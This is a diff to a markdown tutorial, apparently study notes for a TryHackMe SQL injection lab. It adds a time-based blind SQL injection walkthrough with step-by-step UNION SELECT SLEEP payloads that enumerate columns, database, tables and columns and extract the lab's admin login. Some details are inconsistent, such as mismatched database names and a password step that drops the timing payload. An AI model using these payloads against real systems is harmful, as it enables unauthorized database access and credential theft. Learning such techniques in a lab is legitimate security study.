@@ -160,8 +160,39 @@ suppose, the column name username and another is password
  After,sequentially Repeating this process you will get column username value and this is:admin.
  
 #### Step 6:Find out password column value
-admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+        admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
 if you properly do this , you will get password 
+# Time Base SQL Injection
+A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
+So, for example, when trying to establish the number of columns in a table, you would use the following query:
+      
+      admin123' UNION SELECT SLEEP(5);--
+#### Step 1:Find out actual column number
+      admin123' UNION SELECT SLEEP(5);--
+If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
+      admin123' UNION SELECT SLEEP(5),2;--
+if again no pause in the response time , increase column number like
+      admin123' UNION SELECT SLEEP(5),2,3;--
+### Step 2:Find out dabase name 
+      admin123' UNION SELECT SLEEP(5),2,3 where database() like 'u%';--
+Here dabase name :sqli_four      
+### Step 3:Find out table name
+      admin123' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+Here table name:users
+#### Step4:Find out Column name
+      admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+Here Column name username and password
+
+#### Step5:Findout Column value
+      admin123' UNION SELECT SLEEP(5),2,3 from users where username like 'a%
+ Here username:admin
+      admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+ Here password:pass
+ SO the target login credentials 
+                                ***username:admin
+                                password:pass***
 ## Practicing and Learning Resources:
 
 #### Try Hack Me :
